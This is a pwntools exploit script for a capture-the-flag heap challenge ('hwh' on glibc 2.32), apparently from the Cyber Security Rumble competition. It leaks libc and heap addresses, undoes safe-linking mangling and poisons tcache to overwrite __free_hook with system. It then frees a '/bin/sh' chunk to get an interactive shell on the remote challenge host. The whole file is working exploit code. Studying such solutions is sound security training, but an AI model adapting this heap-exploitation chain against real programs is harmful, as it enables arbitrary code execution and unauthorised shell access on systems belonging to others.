from pwn import *
import sys

#LIBC = ELF('./libc-2.32.so',checksec = False)

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)

if(len(sys.argv)>1):
    io=remote("chal.cybersecurityrumble.de",8263)
    context.noptrace = True
else:
    io=process("./hwh" ,env = {"LD_PRELOAD": "./libc-2.32.so"})
    #gdb.attach(io)

def choice(i):
    sla("> ",str(i))

def add(idx,size):
    choice(1)
    sla("index: ",str(idx))
    sla("size: ",str(size))

def free(idx):
    choice(2)
    sla("index: ",str(idx))

def read(idx,size):
    choice(3)
    sla("index: ",str(idx))
    sla("size: ",str(size))

def write(idx,size,data):
    choice(4)
    sla("index: ",str(idx))
    sla("size: ",str(size))
    sl(data)

if __name__ == "__main__":
    add(0,0x500)
    add(1,0x10)
    free(0)
    add(0,0x500)
    read(0,0x8)
    libc = u64(re(6) + '\x00'*2)
    libc_base = libc - 0x1c2a60
    log.info("leak = " + hex(libc))
    log.info("libc = " + hex(libc_base))
    malloc_hook = libc_base + 0x1c29f0
    free_hook = libc_base + 0x1c5ca0
    gadget = libc_base + 0xcda5a
    system = libc_base + 0x4a830
    write_addr = malloc_hook - 0x30 + 0x5 - 0x8
    for i in range(2,14):
        add(i, 0x60)
    for i in range(2,9):
        free(i)
    free(10)
    free(12)
    read(9,0x78)
    re(0x70)
    key = u64(re(8)) + 16
    read(11,0x78)
    re(0x70)
    v = u64(re(8))
    heap = key ^ v
    heap_base = heap - 0xb50
    log.info("key = " + hex(key))
    log.info("heap leak = " + hex(heap))
    log.info("heap base = " + hex(heap_base))

    structure = heap_base + 0x10
    key = structure >> 12
    addr = structure ^ key

    payload = "a"*0x68
    payload += "\x71"
    payload += "\x00"*7
    payload += p64(addr)
    for i in range(14,30): #cleanup
        add(i, 0x60)
    free(26)
    free(28)
    write(27,len(payload),payload)
    add(30, 0x60)
    add(31, 0x60)
    free(30)
    #31 is allocation at tcache structure
    payload = ""
    payload += "\x00"*10 + "\x01"
    payload = payload.ljust(0xa8,"\x00")
    payload += p64(free_hook)
    write(31,len(payload),payload)
    add(32, 0x60)
    write(32, len(p64(system)), p64(system))
    add(33, 0x8)
    write(33, 0x8, "/bin/sh\x00")
    free(33)
    #gdb.attach(io)
    io.interactive()